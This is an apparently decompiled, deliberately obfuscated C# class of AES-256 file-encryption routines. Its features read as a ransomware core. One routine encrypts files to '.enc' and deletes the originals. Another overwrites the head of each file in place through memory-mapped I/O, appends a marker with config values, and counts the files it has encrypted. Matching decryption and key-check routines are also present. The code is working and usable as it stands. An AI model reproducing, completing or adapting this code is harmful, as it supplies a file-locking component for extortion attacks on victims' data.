using System;
using System.IO;
using System.IO.MemoryMappedFiles;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

namespace vQzMGKHeycFziMq;

public static class xPAIwPiUUms
{
	public const int OCJiVXTzqhbm = 256;

	public static byte[] WNwkFgpkIKTMOY(int facwSAKlxAFLfezs)
	{
		byte[] array = new byte[facwSAKlxAFLfezs];
		using RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		rNGCryptoServiceProvider.GetBytes(array);
		return array;
	}

	public static bool upboMCeESlBc(string uylxTvHOMCgMhIo, byte[] rfysunwnklbrCYP, bool mJqYmixFxDpoR)
	{
		byte[] array = WNwkFgpkIKTMOY(16);
		using FileStream fileStream = new FileStream(uylxTvHOMCgMhIo + ".enc", FileMode.Create);
		Rfc2898DeriveBytes rfc2898DeriveBytes = gsRZXuELzuGBCwG(rfysunwnklbrCYP, array);
		rfysunwnklbrCYP = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		fileStream.Write(array, 0, array.Length);
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateEncryptor(), CryptoStreamMode.Write);
		using FileStream fileStream2 = new FileStream(uylxTvHOMCgMhIo, FileMode.Open);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			int count;
			while ((count = fileStream2.Read(array2, 0, array2.Length)) > 0)
			{
				cryptoStream.Write(array2, 0, count);
			}
			if (mJqYmixFxDpoR)
			{
				File.Delete(uylxTvHOMCgMhIo);
			}
			cryptoStream.Close();
			fileStream.Close();
			fileStream2.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static bool cvBMqFxuaDS(string sBlgHHolJJFzE, byte[] NKqPbyjKWRJygvY, bool jSsQCKsFqODy)
	{
		byte[] array = new byte[16];
		using FileStream fileStream = new FileStream(sBlgHHolJJFzE, FileMode.Open);
		fileStream.Read(array, 0, array.Length);
		Rfc2898DeriveBytes rfc2898DeriveBytes = gsRZXuELzuGBCwG(NKqPbyjKWRJygvY, array);
		NKqPbyjKWRJygvY = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.ISO10126;
		aes.Mode = CipherMode.CBC;
		using CryptoStream cryptoStream = new CryptoStream(fileStream, aes.CreateDecryptor(), CryptoStreamMode.Read);
		using FileStream fileStream2 = new FileStream(sBlgHHolJJFzE.Remove(sBlgHHolJJFzE.Length - 4), FileMode.Create);
		byte[] array2 = new byte[1];
		rfc2898DeriveBytes.Dispose();
		try
		{
			while (cryptoStream.Read(array2, 0, array2.Length) > 0)
			{
				fileStream2.Write(array2, 0, array2.Length);
			}
			cryptoStream.FlushFinalBlock();
			fileStream2.Close();
			fileStream.Close();
			cryptoStream.Close();
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}

	public static byte[] eiKYzlcqJmBscwSj(byte[] pePDwXCkJkp, byte[] PPPinqcPESeuKgBE, byte[] wSPRlakAHXf)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = gsRZXuELzuGBCwG(PPPinqcPESeuKgBE, wSPRlakAHXf);
		PPPinqcPESeuKgBE = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateEncryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(pePDwXCkJkp, 0, pePDwXCkJkp.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static byte[] QTzEUdTuPeCTHF(byte[] OFqJrIVhWpXh, byte[] vTangOnFGBXl, byte[] fThIQUqcvTI)
	{
		byte[] result = null;
		Rfc2898DeriveBytes rfc2898DeriveBytes = gsRZXuELzuGBCwG(vTangOnFGBXl, fThIQUqcvTI);
		vTangOnFGBXl = null;
		GC.Collect();
		using Aes aes = new AesManaged();
		aes.KeySize = 256;
		aes.Key = rfc2898DeriveBytes.GetBytes(aes.KeySize / 8);
		aes.IV = rfc2898DeriveBytes.GetBytes(aes.BlockSize / 8);
		aes.Padding = PaddingMode.None;
		aes.Mode = CipherMode.CBC;
		using (MemoryStream memoryStream = new MemoryStream())
		{
			using (CryptoStream cryptoStream = new CryptoStream(memoryStream, aes.CreateDecryptor(), CryptoStreamMode.Write))
			{
				cryptoStream.Write(OFqJrIVhWpXh, 0, OFqJrIVhWpXh.Length);
				cryptoStream.Close();
			}
			result = memoryStream.ToArray();
		}
		rfc2898DeriveBytes.Dispose();
		return result;
	}

	public static bool vylWdShXWCM(byte[] GEbFDBtJGuVV, byte[] WeSWkXWyISSHS, byte[] LuGNPwyZLnC)
	{
		using Rfc2898DeriveBytes rfc2898DeriveBytes = gsRZXuELzuGBCwG(GEbFDBtJGuVV, WeSWkXWyISSHS);
		byte[] bytes = rfc2898DeriveBytes.GetBytes(32);
		return bytes.SequenceEqual(LuGNPwyZLnC);
	}

	public static Rfc2898DeriveBytes gsRZXuELzuGBCwG(byte[] rKoOalbFRKOU, byte[] zLPROKzWpTQI)
	{
		return new Rfc2898DeriveBytes(rKoOalbFRKOU, zLPROKzWpTQI, 52768);
	}

	public static byte[] nBfapMPZnVY(string jmeiBoqQGqXXxU, int SVUScqVyjpx)
	{
		byte[] array = new byte[SVUScqVyjpx];
		try
		{
			if (yzZnBHwSsJOOcf.cIiOGifyTwmZ == "YES")
			{
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(jmeiBoqQGqXXxU, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Read(array, 0, SVUScqVyjpx);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				return array;
			}
			FileStream fileStream = new FileStream(jmeiBoqQGqXXxU, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream.Read(array, 0, SVUScqVyjpx);
			fileStream.Close();
			fileStream.Dispose();
			return array;
		}
		catch (Exception ex)
		{
			if (yzZnBHwSsJOOcf.dwCcrxocWgDvY)
			{
				try
				{
					File.AppendAllText(yzZnBHwSsJOOcf.HXSuIBiFjcFlYv, "File: " + jmeiBoqQGqXXxU + " - Error while reading from file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			FileStream fileStream2 = new FileStream(jmeiBoqQGqXXxU, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
			fileStream2.Read(array, 0, SVUScqVyjpx);
			fileStream2.Close();
			fileStream2.Dispose();
			return array;
		}
	}

	public static bool YcWbtomCNUm(string BGtbjBjZGJVGg, byte[] aGHJdwQqOXo, byte[] KOdDPjVHDFbTgV = null)
	{
		try
		{
			byte[] array = null;
			if (yzZnBHwSsJOOcf.cIiOGifyTwmZ == "YES")
			{
				array = (yzZnBHwSsJOOcf.gIEIPYSAmb ? Encoding.ASCII.GetBytes(yzZnBHwSsJOOcf.jLGThbkXlozfB(yzZnBHwSsJOOcf.furQMgHwAVy) + yzZnBHwSsJOOcf.jLGThbkXlozfB("Kw==") + Convert.ToString(yzZnBHwSsJOOcf.OQWxDJYHGaO) + yzZnBHwSsJOOcf.jLGThbkXlozfB("Kw==")) : Encoding.ASCII.GetBytes(yzZnBHwSsJOOcf.jLGThbkXlozfB(yzZnBHwSsJOOcf.furQMgHwAVy) + yzZnBHwSsJOOcf.jLGThbkXlozfB("LQ==") + Convert.ToString(yzZnBHwSsJOOcf.OQWxDJYHGaO) + yzZnBHwSsJOOcf.jLGThbkXlozfB("LQ==")));
				MemoryMappedFile memoryMappedFile = MemoryMappedFile.CreateFromFile(BGtbjBjZGJVGg, FileMode.Open);
				MemoryMappedViewStream memoryMappedViewStream = memoryMappedFile.CreateViewStream();
				memoryMappedFile.Dispose();
				memoryMappedViewStream.Write(aGHJdwQqOXo, 0, aGHJdwQqOXo.Length);
				memoryMappedViewStream.Flush();
				memoryMappedViewStream.Close();
				memoryMappedViewStream.Dispose();
				using FileStream fileStream = new FileStream(BGtbjBjZGJVGg, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!yzZnBHwSsJOOcf.gIEIPYSAmb)
				{
					fileStream.Write(array, 0, array.Length);
				}
				else
				{
					fileStream.Write(KOdDPjVHDFbTgV, 0, KOdDPjVHDFbTgV.Length);
					fileStream.Write(array, 0, array.Length);
				}
			}
			else
			{
				array = (yzZnBHwSsJOOcf.gIEIPYSAmb ? Encoding.ASCII.GetBytes(yzZnBHwSsJOOcf.jLGThbkXlozfB(yzZnBHwSsJOOcf.furQMgHwAVy) + yzZnBHwSsJOOcf.jLGThbkXlozfB("Kw==") + Convert.ToString(yzZnBHwSsJOOcf.OQWxDJYHGaO) + yzZnBHwSsJOOcf.jLGThbkXlozfB("Kw==")) : Encoding.ASCII.GetBytes(yzZnBHwSsJOOcf.jLGThbkXlozfB(yzZnBHwSsJOOcf.furQMgHwAVy) + yzZnBHwSsJOOcf.jLGThbkXlozfB("LQ==") + Convert.ToString(yzZnBHwSsJOOcf.OQWxDJYHGaO) + yzZnBHwSsJOOcf.jLGThbkXlozfB("LQ==")));
				FileStream fileStream2 = new FileStream(BGtbjBjZGJVGg, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream2.Write(aGHJdwQqOXo, 0, aGHJdwQqOXo.Length);
				fileStream2.Close();
				fileStream2.Dispose();
				using FileStream fileStream3 = new FileStream(BGtbjBjZGJVGg, FileMode.Append, FileAccess.Write, FileShare.ReadWrite);
				if (!yzZnBHwSsJOOcf.gIEIPYSAmb)
				{
					fileStream3.Write(array, 0, array.Length);
				}
				else
				{
					fileStream3.Write(KOdDPjVHDFbTgV, 0, KOdDPjVHDFbTgV.Length);
					fileStream3.Write(array, 0, array.Length);
				}
			}
			yzZnBHwSsJOOcf.MkfVCujHefEQ++;
		}
		catch (Exception ex)
		{
			if (yzZnBHwSsJOOcf.dwCcrxocWgDvY)
			{
				try
				{
					File.AppendAllText(yzZnBHwSsJOOcf.HXSuIBiFjcFlYv, "File: " + BGtbjBjZGJVGg + " - Error while partial writing to file: " + ex.Message + "\r\n");
				}
				catch (Exception)
				{
				}
			}
			try
			{
				byte[] array2 = null;
				array2 = (yzZnBHwSsJOOcf.gIEIPYSAmb ? Encoding.ASCII.GetBytes(yzZnBHwSsJOOcf.jLGThbkXlozfB(yzZnBHwSsJOOcf.furQMgHwAVy) + yzZnBHwSsJOOcf.jLGThbkXlozfB("Kw==") + Convert.ToString(yzZnBHwSsJOOcf.OQWxDJYHGaO) + yzZnBHwSsJOOcf.jLGThbkXlozfB("Kw==")) : Encoding.ASCII.GetBytes(yzZnBHwSsJOOcf.jLGThbkXlozfB(yzZnBHwSsJOOcf.furQMgHwAVy) + yzZnBHwSsJOOcf.jLGThbkXlozfB("LQ==") + Convert.ToString(yzZnBHwSsJOOcf.OQWxDJYHGaO) + yzZnBHwSsJOOcf.jLGThbkXlozfB("LQ==")));
				FileStream fileStream4 = new FileStream(BGtbjBjZGJVGg, FileMode.Open, FileAccess.ReadWrite, FileShare.ReadWrite);
				fileStream4.Write(aGHJdwQqOXo, 0, aGHJdwQqOXo.Length);
				fileStream4.Close();
				fileStream4.Dispose();
				using (FileStream fileStream5 = new FileStream(BGtbjBjZGJVGg, FileMode.Append, FileAccess.Write, FileShare.ReadWrite))
				{
					if (!yzZnBHwSsJOOcf.gIEIPYSAmb)
					{
						fileStream5.Write(array2, 0, array2.Length);
					}
					else
					{
						fileStream5.Write(KOdDPjVHDFbTgV, 0, KOdDPjVHDFbTgV.Length);
						fileStream5.Write(array2, 0, array2.Length);
					}
				}
				return true;
			}
			catch (Exception)
			{
				return false;
			}
		}
		return true;
	}
}
